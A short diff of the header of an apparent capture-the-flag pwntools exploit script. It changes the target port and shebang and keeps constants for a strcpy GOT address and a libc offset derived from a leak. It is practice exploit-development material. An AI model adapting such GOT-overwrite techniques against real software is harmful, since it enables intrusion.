@@ -1,10 +1,10 @@
-#!/usr/bin/python
+#!/usr/bin/env python2
 from pwn import *
 import sys
 
 LOCAL = False
 HOST  = 'challenge.pwny.racing'
-PORT  = 11531
+PORT  = 40006
 
 GOT   = 0x603038  # the address of strcpy in GOT
 LIBC  = 0x18e590  # distance from __strlen_avx2() leak to libc base
